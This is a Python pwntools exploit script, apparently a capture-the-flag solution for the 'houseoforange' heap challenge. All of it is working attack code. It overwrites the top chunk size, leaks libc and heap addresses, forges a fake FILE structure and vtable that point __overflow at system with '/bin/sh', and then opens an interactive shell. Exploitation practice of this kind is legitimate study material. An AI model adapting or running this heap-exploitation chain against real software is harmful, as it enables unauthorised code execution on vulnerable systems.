#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import sys
context.binary = "./houseoforange"

elf = ELF("./houseoforange")
if sys.argv[1] == "l":
    io = process("./houseoforange")
    libc = elf.libc
    libc.sym["main_arena"] = 0x3c4b20
else:
    io = process("./houseoforange")
    libc = ELF("./libc.so.6")
    libc.sym["main_arena"] = 0x3c3b20
#  context.log_level = "debug"

def DEBUG():
    info("malloc -> {:#x}".format(0xDA5))
    info("build ret -> {:#x}".format(0xEE5))
    info("printf -> {:#x}".format(0xF35))
    info("read_n -> {:#x}".format(0x1119))
    raw_input("DEBUG: ")

def build(length, name):
    io.sendlineafter("choice : ", "1")
    sleep(0.01)
    io.sendlineafter("name :", str(length))
    sleep(0.01)
    io.sendafter("Name :", name)
    sleep(0.01)
    io.sendlineafter("Orange:", "1")
    sleep(0.01)
    io.sendlineafter("Orange:", str(0xddaa))
    sleep(0.01)

def see():
    io.sendlineafter("choice : ", "2")
    sleep(0.01)

def upgrade(length, name):
    io.sendlineafter("choice : ", "3")
    sleep(0.01)
    io.sendlineafter("name :", str(length))
    sleep(0.01)
    io.sendafter("Name:", name)
    sleep(0.01)
    io.sendlineafter("Orange:", "1")
    sleep(0.01)
    io.sendlineafter("Orange:", str(0xddaa))
    sleep(0.01)

if __name__ == "__main__":
    build(0x10, '0' * 0x10) # build 1
    # overwrite top_chunk size
    upgrade(0x40, flat('1' * 0x10, 0, 0x21, 0xddaa00000001, 0, 0, 0xfa1)) # upgrade 1

    # trigger _int_free
    build(0x1000, '2' * 0x1000) # build 2

    # large bin
    build(0x400, '33333333') # build 3
    # leak libc
    see()
    io.recvuntil("33333333")
    libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - 1640 - libc.sym['main_arena']
    success("libc -> {:#x}".format(libc.address))
    _IO_list_all = libc.sym['_IO_list_all']
    success("_IO_list_all -> {:#x}".format(_IO_list_all))
    pause()

    # leak heap
    upgrade(0x10, '4' * 0x10) # upgrade 2
    see()
    io.recvuntil('4' * 0x10)
    heapbase = u64(io.recvn(6) + '\0\0') - 0xc0
    success("heapbase -> {:#x}".format(heapbase))
    pause()

    fake_file = flat("/bin/sh\0", 0x61)
    fake_file += flat(0xdeadbeef, _IO_list_all - 0x10) # unsorted bin -> fd/bk
    fake_file += flat(0, 1) # _IO_write_base; _IO_write_ptr
    fake_file = fake_file.ljust(0xc0, '\0')
    fake_file += p64(0) # mode <= 0

    payload = flat('5' * 0x400, 0, 0x21, 0xddaa00000001, 0)
    payload += fake_file
    payload += flat(0, 0, heapbase + 0x5d0) # 0xc8, 0xd0, vtable
    # forge vtable
    fake_vtable = flat(0, 0, 0, libc.sym['system']) # __dummy, __dummy2, __finish, __overflow
    payload += fake_vtable

    upgrade(0x800, payload)
    sleep(0.01)

    #  DEBUG()
    io.sendlineafter("choice : ", "1")

    io.interactive()
